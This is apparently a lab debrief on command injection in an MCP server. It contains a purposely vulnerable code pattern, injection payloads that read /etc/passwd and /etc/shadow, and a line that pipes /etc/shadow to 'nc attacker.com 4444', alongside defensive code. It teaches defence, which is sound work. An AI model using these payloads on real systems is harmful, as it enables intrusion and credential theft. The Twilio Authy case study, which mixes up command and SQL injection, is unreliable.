# 🎓 Mission Debrief: Command Injection

**Congratulations!** You've successfully exploited a command injection vulnerability in an MCP server, demonstrating how unsanitized user input can lead to arbitrary code execution.

## 🎯 What You Accomplished

You discovered that the file processing server passes user input directly to shell commands without sanitization. By injecting shell metacharacters (semicolons, pipes, etc.), you chained additional commands to read the flag from the secrets file.

**OWASP MCP Top 10:2025 Coverage:**
- ✅ **MCP05: Command Injection** - Complete understanding of OS command injection in MCP tools

## 🔍 Vulnerability Deep Dive

### The Attack Vector

```
User Input → MCP Tool Parameter → String Interpolation → subprocess.run(shell=True) → RCE
```

**Vulnerable Code Pattern:**

```python
# DANGEROUS - DO NOT USE
def search_files(pattern, directory):
    command = f"grep -r '{pattern}' {directory}"
    result = subprocess.run(command, shell=True, capture_output=True)
    return result.stdout
```

**Why This Is Dangerous:**

1. **shell=True**: Invokes full shell with all metacharacter interpretation
2. **String formatting**: User input concatenated into command string
3. **No validation**: Accepts any characters including `;`, `|`, `&&`, `$()`, etc.
4. **Implicit trust**: Assumes user input is safe filename/pattern

### Shell Metacharacters Reference

| Character | Function | Example Exploit |
|-----------|----------|----------------|
| `;` | Command separator | `file.txt; cat /etc/passwd` |
| `&&` | AND operator | `file.txt && rm -rf /tmp/*` |
| `\|\|` | OR operator | `nonexistent \|\| whoami` |
| `\|` | Pipe | `file.txt \| nc attacker.com 4444` |
| `` ` `` | Command substitution | ``file.txt`whoami`.jpg`` |
| `$()` | Command substitution | `file$(cat /etc/passwd).txt` |
| `>` | Redirect output | `file.txt > /tmp/stolen` |
| `<` | Redirect input | `file.txt < /etc/shadow` |
| `#` | Comment | `file.txt; evil_cmd #` rest is ignored |
| `\` | Escape | `file\.txt` bypasses character filtering |

### Exploitation Techniques

**1. Command Chaining:**
```bash
# Original: grep 'pattern' /path
# Injected: pattern'; cat /etc/passwd #
# Executed: grep 'pattern'; cat /etc/passwd #' /path
```

**2. Command Substitution:**
```bash
# Original: convert input.jpg output.png
# Injected: $(cat /etc/passwd).jpg
# Executed: convert $(cat /etc/passwd).jpg output.png
```

**3. Pipe to Exfiltration:**
```bash
# Original: tar -czf archive.tar.gz file.txt
# Injected: file.txt; cat /etc/shadow | nc attacker.com 4444 #
# Executed: tar -czf archive.tar.gz file.txt; cat /etc/shadow | nc attacker.com 4444 #
```

**4. Output Redirection:**
```bash
# Original: file filename.txt
# Injected: filename.txt; cat /etc/passwd > /tmp/pwned #
# Executed: file filename.txt; cat /etc/passwd > /tmp/pwned #
```

## 🌍 Real-World Case Study: Twilio Authy Breach (2024)

### The Incident

In July 2024, Twilio's Authy two-factor authentication service suffered a data breach affecting 33 million users due to an unauthenticated API endpoint vulnerability that could be exploited for command injection.

**Timeline:**
- **June 2024**: Unauthenticated endpoint discovered
- **July 1, 2024**: Attackers exploited vulnerability
- **July 5, 2024**: 33M phone numbers exfiltrated
- **July 10, 2024**: Public disclosure after breach

### The Attack

```
Unauthenticated API Endpoint
         ↓
Missing Input Validation
         ↓
Command Injection via User-Agent Header
         ↓
Database Query Injection
         ↓
33 Million Phone Numbers Stolen
```

**Technical Details:**
- Endpoint: `/v1/users/verify` (should require auth, didn't)
- Attack vector: User-Agent header with SQL injection
- No rate limiting on endpoint
- Insufficient input sanitization
- Allowed enumeration of all user phone numbers

**Impact:**
- 33 million user phone numbers exposed
- SMS phishing attacks enabled
- Account takeover risks
- Regulatory fines (GDPR, CCPA violations)
- Reputation damage to critical security service

**What Went Wrong:**
1. Unauthenticated sensitive endpoint
2. No input validation on headers
3. SQL injection vulnerability
4. Insufficient rate limiting
5. Inadequate logging/monitoring

## 🛡️ Defense Strategies

### 1. Never Use shell=True

**WRONG:**
```python
# DANGEROUS - Vulnerable to injection
command = f"grep '{user_input}' file.txt"
subprocess.run(command, shell=True)
```

**RIGHT:**
```python
# SAFE - No shell interpretation
subprocess.run(['grep', user_input, 'file.txt'], shell=False)
```

### 2. Input Validation & Sanitization

**Allowlist Approach (Preferred):**
```python
import re

def validate_filename(filename: str) -> bool:
    """Only allow alphanumeric, dots, dashes, underscores."""
    pattern = r'^[a-zA-Z0-9._-]+$'
    return bool(re.match(pattern, filename))

def search_files_safe(pattern: str, directory: str) -> str:
    # Validate inputs
    if not validate_filename(pattern):
        raise ValueError("Invalid search pattern")

    if not os.path.isdir(directory):
        raise ValueError("Invalid directory")

    # Use array-based execution (no shell)
    result = subprocess.run(
        ['grep', '-r', pattern, directory],
        capture_output=True,
        text=True,
        shell=False  # CRITICAL: No shell
    )
    return result.stdout
```

**Blocklist Approach (Less Secure):**
```python
# Not recommended - can be bypassed
DANGEROUS_CHARS = [';', '&&', '||', '|', '`', '$', '(', ')', '>', '<', '\\']

def sanitize_input(user_input: str) -> str:
    """Remove dangerous shell metacharacters."""
    for char in DANGEROUS_CHARS:
        user_input = user_input.replace(char, '')
    return user_input

# Still use shell=False even with sanitization
```

### 3. Use Python Libraries Instead of Shell Commands

**Instead of shell commands, use Python equivalents:**

```python
# BAD: Shell command injection risk
subprocess.run(f"grep '{pattern}' file.txt", shell=True)

# GOOD: Use Python library
import re
with open('file.txt', 'r') as f:
    for line in f:
        if re.search(pattern, line):
            print(line)

# BAD: Shell tar command
subprocess.run(f"tar -czf archive.tar.gz {path}", shell=True)

# GOOD: Use Python tarfile
import tarfile
with tarfile.open('archive.tar.gz', 'w:gz') as tar:
    tar.add(path)

# BAD: Shell file info
subprocess.run(f"file {filename}", shell=True)

# GOOD: Use Python libraries
import os
import mimetypes
mime_type = mimetypes.guess_type(filename)
file_size = os.path.getsize(filename)
```

### 4. Principle of Least Privilege

```python
import pwd
import os

# Drop privileges before executing commands
def drop_privileges(uid_name='nobody', gid_name='nogroup'):
    """Drop root privileges to specified user."""
    import pwd
    import grp

    running_uid = pwd.getpwnam(uid_name).pw_uid
    running_gid = grp.getgrnam(gid_name).gr_gid

    os.setgroups([])
    os.setgid(running_gid)
    os.setuid(running_uid)

# Set resource limits
import resource

def limit_process():
    """Limit CPU time and memory."""
    # Max CPU time: 5 seconds
    resource.setrlimit(resource.RLIMIT_CPU, (5, 5))
    # Max memory: 100MB
    resource.setrlimit(resource.RLIMIT_AS, (100 * 1024 * 1024, 100 * 1024 * 1024))
```

### 5. Secure MCP Tool Implementation

**Secure Pattern for MCP Tools:**

```python
import shlex
import subprocess
from typing import Dict, Any

class SecureMCPServer:
    ALLOWED_FORMATS = ['png', 'jpg', 'gif', 'bmp']  # Allowlist

    def validate_filename(self, filename: str) -> bool:
        """Validate filename contains only safe characters."""
        import re
        return bool(re.match(r'^[a-zA-Z0-9._-]+$', filename))

    async def convert_image(self, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """
        SECURE: Convert image without command injection.
        """
        input_file = arguments.get("input_file", "")
        output_format = arguments.get("output_format", "")

        # Validate inputs against allowlists
        if not self.validate_filename(input_file):
            return {"error": "Invalid input filename"}

        if output_format not in self.ALLOWED_FORMATS:
            return {"error": "Invalid output format"}

        output_file = f"{input_file.rsplit('.', 1)[0]}.{output_format}"

        # Use array-based execution - NO SHELL
        try:
            result = subprocess.run(
                ['convert', input_file, output_file],  # Array, not string
                capture_output=True,
                text=True,
                timeout=5,
                shell=False,  # CRITICAL
                cwd=self.workspace
            )

            if result.returncode != 0:
                return {"error": f"Conversion failed: {result.stderr}"}

            return {"success": f"Converted {input_file} to {output_file}"}

        except subprocess.TimeoutExpired:
            return {"error": "Conversion timeout"}
        except FileNotFoundError:
            return {"error": "ImageMagick not installed"}
```

### 6. Runtime Application Self-Protection (RASP)

Monitor and block suspicious subprocess calls:

```python
import subprocess
import logging

_original_run = subprocess.run

def monitored_run(*args, **kwargs):
    """Wrapper to detect and block dangerous subprocess calls."""
    # Log all subprocess calls
    logging.warning(f"subprocess.run called with: args={args}, kwargs={kwargs}")

    # Block shell=True entirely
    if kwargs.get('shell', False):
        logging.error("BLOCKED: subprocess.run with shell=True")
        raise SecurityError("shell=True is prohibited for security")

    # Detect shell metacharacters in arguments
    if args and isinstance(args[0], str):
        dangerous = [';', '&&', '||', '|', '`', '$']
        if any(char in args[0] for char in dangerous):
            logging.error(f"BLOCKED: Dangerous characters in command: {args[0]}")
            raise SecurityError("Command contains shell metacharacters")

    return _original_run(*args, **kwargs)

# Monkey-patch subprocess module
subprocess.run = monitored_run
```

## 📊 Command Injection Defense Checklist

| Control | Implementation | Priority |
|---------|---------------|----------|
| **Never use shell=True** | Use array-based `subprocess.run(['cmd', 'arg'])` | CRITICAL |
| **Input validation** | Allowlist alphanumeric + safe chars only | CRITICAL |
| **Use Python libraries** | Replace shell commands with Python modules | HIGH |
| **Least privilege** | Drop privileges before command execution | HIGH |
| **Resource limits** | Set CPU/memory/time limits | MEDIUM |
| **Output sanitization** | Filter command output for sensitive data | MEDIUM |
| **Audit logging** | Log all command executions | HIGH |
| **RASP monitoring** | Runtime detection of dangerous patterns | MEDIUM |

## 🎯 Key Takeaways

### Do's ✅

1. **Use array-based execution**: `subprocess.run(['cmd', 'arg'], shell=False)`
2. **Validate all input**: Allowlist acceptable characters only
3. **Use Python libraries**: Avoid shell commands when possible
4. **Apply least privilege**: Run commands as unprivileged user
5. **Set resource limits**: Timeout, memory, CPU constraints
6. **Audit everything**: Log all command executions
7. **Defense in depth**: Multiple layers of protection

### Don'ts ❌

1. **Don't use shell=True**: Ever. Period.
2. **Don't trust user input**: Validate everything
3. **Don't use string interpolation**: For command construction
4. **Don't rely on blocklists**: Can be bypassed
5. **Don't run as root**: Drop privileges first
6. **Don't ignore errors**: Command failures may indicate attacks

## 🚀 Next Steps

1. **Immediate**: Audit codebase for `shell=True` usage
2. **Short-term**: Replace shell commands with Python libraries
3. **Long-term**: Implement RASP monitoring for command execution

**Continue to Level 06** to explore prompt injection vulnerabilities in MCP contexts.

## 📚 Additional Resources

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Python subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [Twilio Authy Breach Analysis](https://www.twilio.com/blog/incident-report-authy-july-2024)

---

**Mission Complete!** You've mastered command injection exploitation and defense. 🎉
